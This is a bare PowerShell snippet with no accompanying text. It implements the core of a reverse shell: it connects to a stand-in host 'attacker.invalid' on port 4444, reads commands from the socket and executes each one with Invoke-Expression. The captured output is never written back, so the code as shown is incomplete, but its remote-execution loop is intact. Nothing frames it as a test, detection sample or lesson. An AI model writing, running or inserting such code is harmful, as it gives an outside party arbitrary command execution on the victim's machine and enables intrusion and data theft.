$c = New-Object System.Net.Sockets.TCPClient('attacker.invalid', 4444)
$s = $c.GetStream()
$b = New-Object byte[] 1024
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = [Text.Encoding]::ASCII.GetString($b, 0, $i)
    $o = (iex $d 2>&1 | Out-String)
}
